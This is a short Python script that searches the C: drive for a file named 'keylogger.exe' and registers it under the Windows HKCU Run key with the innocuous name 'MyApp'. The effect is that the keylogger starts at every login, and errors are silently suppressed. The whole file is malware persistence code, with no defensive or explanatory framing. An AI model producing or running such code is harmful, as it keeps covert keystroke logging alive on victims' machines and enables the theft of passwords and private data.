import winreg as reg
import os

def find_exe(filename):
    for root, _, files in os.walk("C:\\"):
        if filename in files:
            return os.path.join(root, filename)
    return None

def add_to_registry(exe_path, app_name="MyApp"):
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, exe_path)
        reg.CloseKey(reg_key)
    except Exception:
        pass

exe_path = find_exe("keylogger.exe")
if exe_path:
    add_to_registry(exe_path)
